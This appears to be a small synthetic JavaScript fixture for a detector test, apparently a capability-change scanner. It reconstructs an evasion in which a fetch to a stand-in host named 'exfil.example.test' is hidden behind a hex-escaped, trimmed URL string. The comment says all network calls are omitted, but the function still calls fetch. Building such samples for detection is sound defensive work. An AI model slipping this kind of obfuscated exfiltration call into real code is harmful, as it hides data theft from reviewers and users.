// DEFANGED RECONSTRUCTION for ADR-026, modeled on the escaped-string evasion.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch whose URL is hidden behind a glued hex escape in the source.
// Omitted: every network call; the host is a reserved .example.test name.
module.exports = function run() {
  return fetch("\x20https://exfil.example.test/c".trim());
};
